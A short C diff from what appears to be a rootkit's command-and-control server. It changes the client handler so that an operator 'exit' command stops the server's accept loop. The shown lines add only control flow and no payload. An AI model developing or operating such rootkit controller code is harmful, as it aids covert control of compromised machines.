@@ -72,9 +72,12 @@ static int do_auth(client_t *c)
  * @brief Authenticates then drives the command loop for a single rootkit client.
  *        Frees @p c before returning.
  * @param c  Heap-allocated client descriptor (ownership transferred).
+ * @return 0 on normal disconnect, 1 if operator typed 'exit' (server should stop).
  */
-static void handle_client(client_t *c)
+static int handle_client(client_t *c)
 {
+    int exit_cmd = 0;
+
     log_event("New connection from %s:%d\n", c->remote_ip, c->remote_port);
     c->connected = 1;
     c->authed    = 0;
@@ -84,7 +87,7 @@ static void handle_client(client_t *c)
         c->authed = 1;
         log_event("Rootkit authenticated from %s:%d\n",
                   c->remote_ip, c->remote_port);
-        commands_loop(c);
+        exit_cmd = commands_loop(c);
     }
 
     c->connected = 0;
@@ -92,6 +95,7 @@ static void handle_client(client_t *c)
     close(c->fd);
     log_event("Disconnected from %s:%d\n", c->remote_ip, c->remote_port);
     free(c);
+    return exit_cmd;
 }
 
 /**
@@ -166,8 +170,8 @@ void server_run(int srv_fd)
     while (1)
     {
         c = accept_client(srv_fd);
-        if (c)
-            handle_client(c);
+        if (c && handle_client(c))
+            break;
     }
 }
 
